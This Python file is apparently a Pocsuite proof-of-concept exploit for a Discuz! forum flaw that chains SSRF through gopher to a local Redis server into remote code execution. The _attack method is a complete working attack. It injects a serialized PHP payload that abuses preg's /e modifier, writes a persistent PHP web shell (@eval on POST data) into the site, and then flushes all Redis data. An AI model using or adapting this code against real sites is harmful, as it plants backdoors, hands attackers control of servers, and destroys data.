#!/usr/bin/env python
#coding:utf-8
# @Date    : 2016-06-24 19:17:19
# @Author  : DshtAnger(dshtanger@gmail.com)
import string,base64,urlparse,random,hashlib,base64

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class TestPOC(POCBase):
    vulID = '91879' #ssvid-91879
    version = '1'
    author = 'DshtAnger'
    vulDate = '2016-06-17'
    createDate = '2016-06-24'
    updateDate = '2016-06-24'
    references = ['https://www.seebug.org/vuldb/ssvid-91879']
    name = 'Discuz!Conditional Remote Command Execution Using SSRF!'
    appPowerLink = 'http://www.discuz.net'
    appName = 'Discuz!'
    appVersion = 'x'
    vulType = 'Code Execution'
    desc =  '''
            Discuz ssrf+redis/memcache Code Execution getshell
            '''
    samples = []
    install_requires = []

    def _attack(self):
        result = {}
        url_part = self.url.rpartition('/')

        payload = ('gopher://127.0.0.1:6379/xeval '
                '"local t=redis.call(\'keys\',\'*_setting\');'
                'for i,v in ipairs(t) do redis.call(\'set\',v,'
                '\'a:2:{s:6:\\"output\\";a:1:{s:4:\\"preg\\";'
                'a:2:{s:6:\\"search\\";a:1:{s:7:\\"plugins\\";'
                's:5:\\"/^./e\\";}s:7:\\"replace\\";a:1:{s:7:\\"plugins\\";'
                's:40:\\"system(base64_decode($_GET[dshtanger]));\\";}}}'
                's:13:\\"rewritestatus\\";a:1:{s:7:\\"plugins\\";i:1;}}\') end;'
                'return 1;" 0 %250D%250Aquit')
        
        target_url = self.url + payload
        vul_rep = req.get(target_url)
        
        while vul_rep.status_code == 200:
            shell_url = url_part[0] + '/forum.php?mod=ajax&inajax=yes&action=getthreadtypes'
            shell_rep = req.get(shell_url)

            if shell_rep.status_code == 200:                
                random_sed = string.letters+string.digits
                flag = ''.join([random.choice(random_sed) for _ in range(8)])
                shell_flag = ''.join([random.choice(random_sed) for _ in range(8)])
                
                #use system() write a shell php file and shell will retained after flushing redis apache
                shell_payload = 'echo \'<?php @eval($_POST[dshtanger]);echo "' + flag + '";?>\' > ' + shell_flag + '.php'
                shell_payload_b64 = base64.b64encode(shell_payload)
                #write a random php file
                req.get(shell_url + '&dshtanger=' + shell_payload_b64)
                #access this php file
                verify_url = url_part[0] + '/' + shell_flag + '.php'
                verify_rep = req.get(verify_url)

                if (verify_rep.status_code == 200) and ( flag in verify_rep.content):
                    result['ShellInfo'] = {}
                    result['ShellInfo']['URL'] = verify_url
                    result['ShellInfo']['Content'] = '@eval($_POST[dshtanger]);'

                    #recover website
                    flush_payload = 'gopher://127.0.0.1:6379/xflushall%0D%0Aquit'
                    flush_url = self.url + flush_payload
                    req.get(flush_url)

                    test_url = url_part[0] + '/forum.php'
                    req.get(test_url)

                    break                    
        return self.parse_output(result)


    def _verify(self):
        result = {}
        url_part = self.url.rpartition('/')
        #ssrf_url = "ssrf_gopher.php?ssrf="
        random_sed = string.letters+string.digits
        flag = ''.join([random.choice(random_sed) for _ in xrange(16)])
        payload = ('gopher://127.0.0.1:6379/xeval '
                '"local t=redis.call(\'keys\',\'*_setting\');'
                'for i,v in ipairs(t) do redis.call(\'set\',v,'
                '\'a:2:{s:6:\\"output\\";a:1:{s:4:\\"preg\\";'
                'a:2:{s:6:\\"search\\";a:1:{s:7:\\"plugins\\";'
                's:5:\\"/^./e\\";}s:7:\\"replace\\";a:1:{s:7:\\"plugins\\";'
                's:22:\\"md5('+ flag +');\\";}}}'
                's:13:\\"rewritestatus\\";a:1:{s:7:\\"plugins\\";i:1;}}\') end;'
                'return 1;" 0 %250D%250Aquit')
        
        target_url = self.url + payload
        target_rep = req.get(target_url)

        while target_rep.status_code == 200 :
            poc_url = url_part[0] +'/forum.php?mod=ajax&inajax=yes&action=getthreadtypes'
            poc_rep = req.get(poc_url)
            flag_hash = hashlib.md5(flag).hexdigest()
            
            if flag_hash in poc_rep.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = poc_url

                #recover website
                flush_payload = 'gopher://127.0.0.1:6379/xflushall%0D%0Aquit'
                flush_url = self.url + flush_payload
                req.get(flush_url)

                test_url = url_part[0] + '/forum.php'
                req.get(test_url)

                break
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)